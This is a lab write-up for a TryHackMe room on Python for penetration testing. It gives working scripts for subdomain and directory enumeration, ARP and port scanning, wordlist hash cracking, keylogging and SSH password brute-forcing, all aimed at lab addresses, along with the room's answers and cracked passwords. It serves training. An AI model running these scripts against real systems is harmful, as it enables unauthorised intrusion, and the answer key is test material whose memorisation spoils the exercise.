---
description: https://tryhackme.com/room/pythonforcybersecurity
---

# Python for Pentesters

## Task 1 Introduction

#### What other tool can be used to convert Python scripts to Windows executables?

{% hint style="success" %}
`py2exe`
{% endhint %}

## Task 2 Subdomain Enumeration

```python
import requests
import sys

with open("wordlist2.txt") as f:
    subdoms = f.read().splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}"
    try:
        requests.get(sub_domains)
    except requests.ConnectionError:
        pass
    else:
        print("Valid domain:", sub_domains)
```

#### What other protocol could be used for subdomain enumeration?

{% hint style="success" %}
`DNS`
{% endhint %}

#### What function does Python use to get the input from the command line?

{% hint style="success" %}
`sys.argv`
{% endhint %}

## Task 3 Directory Enumeration

```python
import requests
import sys

with open("wordlist2.txt") as f:
    directories = f.read().splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html"
    r = requests.get(dir_enum)
    if r.status_code != 404:
        print("Valid directory", dir_enum)
```

#### How many directories can your script identify on the target system?

```bash
python3 main.py 10.10.44.151
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 18-56-29.png>)

{% hint style="success" %}
`4`
{% endhint %}

#### What is the location of the login page?

![](<../../.gitbook/assets/Screenshot from 2022-03-19 18-58-54.png>)

{% hint style="success" %}
`private.html`
{% endhint %}

#### Where did you find a cryptic hash?

![](<../../.gitbook/assets/Screenshot from 2022-03-19 18-59-35.png>)

{% hint style="success" %}
`apollo.html`
{% endhint %}

#### Where are the usernames located?

![](<../../.gitbook/assets/Screenshot from 2022-03-19 18-59-54.png>)

{% hint style="success" %}
`surfer.html`
{% endhint %}

#### What is the password assigned to Rabbit?

{% hint style="success" %}
`LOUSYRABBO`
{% endhint %}

## Task 4 Network Scanner

```python
from scapy.all import *

interface = "eth0"
ip_range = "10.0.2.0/24"

packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
ans, unans = srp(packet, timeout=2, iface=interface, inter=0.1)

for send, recv in ans:
    print(recv.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

#### What module was used to create the ARP request packets?

{% hint style="success" %}
`scapy`
{% endhint %}

#### Which variable would you need to change according to your local IP block?

{% hint style="success" %}
`ip_range`
{% endhint %}

#### What variable would you change to run this code on a system with the network interface named ens33?

{% hint style="success" %}
`interface`
{% endhint %}

## Task 5 Port Scanner

```python
import socket

ip = '10.10.44.151'
open_ports = []
ports = range(1, 65536)


def probe_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        r = sock.connect_ex((ip, port))
        sock.close()
    except Exception as e:
        r = 1
    return r


for port in ports:
    if probe_port(ip, port) == 0:
        open_ports.append(port)

if open_ports:
    print("Open Ports are: ")
    print(sorted(open_ports))
else:
    print("Looks like no ports are open :(")
```

#### What protocol will most likely be using TCP port 22?

{% hint style="success" %}
`SSH`
{% endhint %}

#### What module did we import to be able to use sockets?

{% hint style="success" %}
`socket`
{% endhint %}

#### What function is likely to fail if we didn't import sys?

{% hint style="success" %}
`sys.stdout.flush()`
{% endhint %}

#### How many ports are open on the target machine?

```bash
python3 main.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 20-29-01.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### What is the highest port number open on the target system?

{% hint style="success" %}
`2100`
{% endhint %}

## Task 6 File Downloader

```python
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
with open('PSTools.zip', 'wb') as f:
    f.write(r.content)
```

#### What is the function used to connect to the target website?

{% hint style="success" %}
`requests.get()`
{% endhint %}

#### What step of the Unified Cyber Kill Chain can PSexec be used in?

{% embed url="https://info.varonis.com/hubfs/Imported_Blog_Media/cyber-kill-chain-phases-2@2x.png?hsLang=en" %}

{% hint style="success" %}
`Lateral Movement`
{% endhint %}

## Task 7 Hash Cracker

```bash
import hashlib

wordlist_location = "wordlist2.txt"
hash_input = "cd13b6a6af66fb774faa589a9d18f906"

with open(wordlist_location, 'r') as file:
    for line in file.read().splitlines():
        hash_ob = hashlib.md5(line.encode())
        if hash_ob.hexdigest() == hash_input:
            print('Found cleartext password!', line)
            exit(0)
```

#### What is the hash you found during directory enumeration?

{% hint style="success" %}
`cd13b6a6af66fb774faa589a9d18f906`
{% endhint %}

#### What is the cleartext value of this hash?

```bash
python3 hash.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 20-01-26.png>)

{% hint style="success" %}
`rainbow`
{% endhint %}

#### Modify the script to work with SHA256 hashes.

```python
import hashlib

wordlist_location = "wordlist2.txt"
hash_input = "5030c5bd002de8713fef5daebd597620f5e8bcea31c603dccdfcdf502a57cc60"

with open(wordlist_location, 'r') as file:
    for line in file.read().splitlines():
        hash_ob = hashlib.sha256(line.encode())
        if hash_ob.hexdigest() == hash_input:
            print('Found cleartext password!', line)
            exit(0)
```

#### Using the modified script find the cleartext value for 5030c5bd002de8713fef5daebd597620f5e8bcea31c603dccdfcdf502a57cc60

```bash
python3 hash.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 20-03-47.png>)

{% hint style="success" %}
`redwings`
{% endhint %}

## Task 8 keyloggers

```python
import keyboard
keys = keyboard.record(until='ENTER')
keyboard.play(keys)
```

#### What package installer was used?

{% hint style="success" %}
`pip3`
{% endhint %}

#### What line in this code would you change to stop the result from being printed on the screen?

{% hint style="success" %}
`keyboard.play(keys)`
{% endhint %}

## Task 9 SSH Brute Forcing

```python
import paramiko

target = '10.10.44.151'
username = 'tiffany'
password_file = 'wordlist2.txt'


def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        code = 0
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


with open(password_file, 'r') as file:
    for password in file.read().splitlines():
        try:
            if ssh_connect(password) == 0:
                print('password found:', password)
                exit(0)
            else:
                print('no luck')
        except Exception as e:
            print(e)
```

#### What username starting with the letter "t" did you find earlier?

{% hint style="success" %}
`tiffany`
{% endhint %}

#### What is the SSH password of this user?

![](<../../.gitbook/assets/Screenshot from 2022-03-19 20-21-18.png>)

{% hint style="success" %}
`trustno1`
{% endhint %}

#### What is the content of the flag.txt file?

```bash
ssh tiffany@10.10.44.151
find / -type f -name flag.txt 2>/dev/null
cat flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 20-22-54.png>)

{% hint style="success" %}
`THM-737390028`
{% endhint %}
